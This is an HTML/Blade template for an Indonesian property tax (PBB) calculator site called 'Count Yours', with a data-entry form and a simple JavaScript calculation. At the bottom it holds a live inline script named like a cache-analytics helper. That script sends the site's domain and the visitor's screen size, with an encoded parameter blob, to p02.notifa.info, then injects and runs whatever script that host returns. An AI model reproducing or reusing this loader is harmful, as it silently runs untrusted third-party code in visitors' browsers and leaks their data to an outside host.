<!doctype html>
<html lang="en">

<!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:53:46 GMT -->

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <title>Count Yours</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="vendors/bootstrap-selector/css/bootstrap-select.min.css">
    <!--icon font css-->
    <link rel="stylesheet" href="vendors/themify-icon/themify-icons.css">
    <link rel="stylesheet" href="vendors/flaticon/flaticon.css">
    <link rel="stylesheet" href="vendors/animation/animate.css">
    <link rel="stylesheet" href="vendors/owl-carousel/assets/owl.carousel.min.css">
    <link rel="stylesheet" href="vendors/magnify-pop/magnific-popup.css">
    <link rel="stylesheet" href="vendors/nice-select/nice-select.css">
    <link rel="stylesheet" href="vendors/elagent/style.css">
    <link rel="stylesheet" href="vendors/scroll/jquery.mCustomScrollbar.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/responsive.css">
</head>

<body>
    <div class="body_wrapper">
        <header class="header_area">
            <nav class="navbar navbar-expand-lg menu_one menu_four">
                <div class="container">
                    <a class="navbar-brand sticky_logo" href="/home"><img src="img/logotax.png" srcset="img/logo2x-2.png 2x" alt="logo"><img src="img/logotax2.png" srcset="img/logo2x.png 2x" alt=""></a>
                    <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="menu_toggle">
                            <span class="hamburger">
                                <span></span>
                                <span></span>
                                <span></span>
                            </span>
                            <span class="hamburger-cross">
                                <span></span>
                                <span></span>
                            </span>
                        </span>
                    </button>

                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
                        <ul class="navbar-nav menu w_menu ml-auto">
                            <li class="nav-item dropdown submenu mega_menu mega_menu_two active">
                                <a class="nav-link dropdown-toggle" href="/home" role="button" aria-haspopup="true" aria-expanded="false">
                                    Home
                                </a>
                            </li>
                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/aboutus">About Us</a>
                            </li>
                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
                            </li>
                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
                            </li>
                            <li class="nav-item dropdown submenu">
                                <a class="nav-link dropdown-toggle" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    Hi! {{ Auth::user()->name }}
                                </a>
                            </li>
                            </li>
                        </ul>
                    </div>
                    <a class="btn_get btn_hover hidden-sm hidden-xs" href="{{ route('logout') }}" onclick="event.preventDefault(); document.getElementById('logout-form').submit();">{{ __('Logout') }}</a>
                    <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                        @csrf
                    </form>
                </div>
            </nav>
        </header>
        <section class="breadcrumb_area">
            <img class="breadcrumb_shap" src="img/breadcrumb/banner_bg.png" alt="">
            <div class="container">
                <div class="breadcrumb_content text-center">
                    <h1 class="f_p f_700 f_size_50 w_color l_height50 mb_20">Penghitung Pajak Bumi & Bangunan<br>Count Yours</h1>
                </div>
            </div>
        </section>
        <section class="payment_features_two sec_pad">
            <div class="container">
                <div class="sign_info">
                    <div class="sec_title text-center mb_70 wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
                        <h2 class="f_p f_size_30 l_height50 f_700 t_color">Isi Form Berikut</h2>
                        <p class="f_400 f_size_18 l_height34">Form harus diisi dengan data yang valid dan sesuai</p>
                    </div>
                    <form action="#" class="login-form sign-in-form">
                        <div class="form-group text_box">
                            <label class="f_p text_c f_400">Nomor Objek Pajak</label>
                            <input type="number" name="npwp" placeholder="Masukkan Nomor">
                        </div>
                        <div class="form-group text_box">
                            <label for="status" class="f_p text_c f_400">Status Bangunan: </label>
                            <select id="status" name="status">
                                <option value="1">Perumahan</option>
                                <option value="2">Perkantoran</option>
                                <option value="3">Pabrik</option>
                                <option value="4">Toko/Apotik/Ruko</option>
                                <option value="5">Rumah Sakit/Klinik</option>
                                <option value="6">Bengkel/Gudang</option>
                                <option value="7">Hotel/Wisma/Restoran</option>
                                <option value="8">Apartemen/Kondominium</option>
                                <option value="9">Gedung Pemerintah</option>
                                <option value="10">Lain Lain</option>
                            </select>
                        </div>
                        <div class="form-group text_box">
                            <label class="f_p text_c f_400">Luas Tanah</label>
                            <input type="number" required="required" name="luasTanah" id="luasTanah" placeholder="Masukkan dalam besaran Meter Persegi">
                        </div>
                        <div class="form-group text_box">
                            <label class="f_p text_c f_400">Harga Tanah</label>
                            <input type="number" required="required" name="hargaTanah" id="hargaTanah" placeholder="Harga Dalam Juta/Meter Persegi">
                        </div>
                        <div class="form-group text_box">
                            <label class="f_p text_c f_400">Luas Bangunan</label>
                            <input type="number" required="required" name="luasBangunan" id="luasBangunan" placeholder="Masukkan dalam besaran Meter Persegi">
                        </div>
                        <div class="form-group text_box">
                            <label class="f_p text_c f_400">Harga Bangunan</label>
                            <input type="number" required="required" name="hargaBangunan" id="hargaBangunan" placeholder="Harga Dalam Juta/Meter Persegi">
                        </div>
                        <div class="d-flex justify-content-between align-items-center">
                            <input type="button" class="btn_get btn_hover hidden-sm hidden-xs" value="Calculate" onclick="Calculate()" />
                    </form>
                </div>
                <br><br>
                <p class="f_700">Nilai Jual Objek Pajak Anda Adalah : </p>
                <p id="a1"></p>
                <p class="f_700">Nilai Jual Kena Pajak Anda Adalah : </p>
                <p id="a2"></p>
                <p class="f_700">Nilai Pajak Bumi dan Bangunan Anda Adalah : </p>
                <p id="a3"></p>
            </div>
        </section>

        </section>
        <section class="payment_priceing_area">
            <div class="container">
                <div class="sec_title mb_70 wow fadeInUp text-center" data-wow-delay="0.4s">
                    <h2 class="f_p f_size_30 l_height40 f_700 t_color">Tools Gratis, <br>Tidak Dipungut Biaya</h2>
                    <p class="f_400 f_size_18 l_height34">Gunakan tools ini secara gratis tanpa harus membayar sepeserpun uang<br> Ini benar-benar gratis!</p>
                </div>
            </div>
        </section>
        <section class="payment_subscribe_area">
            <div class="container">
                <div class="payment_subscribe_info">
                    <div class="payment_subscribe_content">
                        <h2>Ingin berlangganan?</h2>
                        <p>Berlangganan info terbaru secara gratis <br>hanya menggunakan email.</p>
                    </div>
                    <form action="#" class="subscribe-form">
                        <input type="text" class="form-control" placeholder="Email address">
                        <button type="submit" class="btn_hover btn_four">Berlangganan</button>
                    </form>
                </div>
            </div>
        </section>
        <footer class="payment_footer_area">
            <div class="footer_top_six">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-4 col-sm-6">
                            <div class="f_widget company_widget">
                                <a href="/home" class="f-logo"><img src="img/bigtaxlogo.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
                                <p class="mt_40">Count Yours adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br>
                                <h6 style="color:white;">Copyright © 2020 TaxGenerator.com</h6>
                                </p>
                            </div>
                        </div>
                        <div class="col-lg-3 col-sm-6">
                            <div class="f_widget about-widget">
                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Page</h3>
                                <ul class="list-unstyled f_list">
                                    <li><a href="/aboutus">About Us</a></li>
                                    <li><a href="/disclaimer">Disclaimer</a></li>
                                    <li><a href="/privacy">Privacy Policy</a></li>
                                    <li><a href="#">Contact</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-sm-6">
                            <div class="f_widget about-widget">
                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Developer</h3>
                                <ul class="list-unstyled f_list">
                                    <li><a href="#">Stefhani Alba Siregar</a></li>
                                    <li><a href="#">Farrah Fahira Murzani</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-2 col-sm-6">
                            <div class="f_widget social-widget">
                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Follow Us</h3>
                                <div class="f_social_icon">
                                    <a href="#" class="ti-facebook"></a>
                                    <a href="#" class="ti-twitter-alt"></a>
                                    <a href="#" class="ti-vimeo-alt"></a>
                                    <a href="#" class="ti-pinterest"></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script>
        function Calculate() {
            var luasTanah = document.getElementById("luasTanah").value;
            var luasBangunan = document.getElementById("luasBangunan").value;
            var hargaTanah = document.getElementById("hargaTanah").value;
            var hargaBangunan = document.getElementById("hargaBangunan").value;
            var status = document.getElementById("status").value;
            var njop = (luasTanah * hargaTanah) + (luasBangunan * hargaBangunan);
            var njkp = njop * 0.2;
            var pbb = njkp * 0.05;
            document.getElementById("a1").innerHTML = numberWithCommas(njop);
            document.getElementById("a2").innerHTML = numberWithCommas(njkp);
            document.getElementById("a3").innerHTML = numberWithCommas(pbb);

        }

        function numberWithCommas(x) {
            return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        }
    </script>
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/propper.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="vendors/wow/wow.min.js"></script>
    <script src="vendors/sckroller/jquery.parallax-scroll.js"></script>
    <script src="vendors/owl-carousel/owl.carousel.min.js"></script>
    <script src="vendors/imagesloaded/imagesloaded.pkgd.min.js"></script>
    <script src="vendors/isotope/isotope-min.js"></script>
    <script src="vendors/magnify-pop/jquery.magnific-popup.min.js"></script>
    <script src="vendors/bootstrap-selector/js/bootstrap-select.min.js"></script>
    <script src="vendors/nice-select/jquery.nice-select.min.js"></script>
    <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="js/plugins.js"></script>
    <script src="js/main.js"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

<!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:54:12 GMT -->

</html>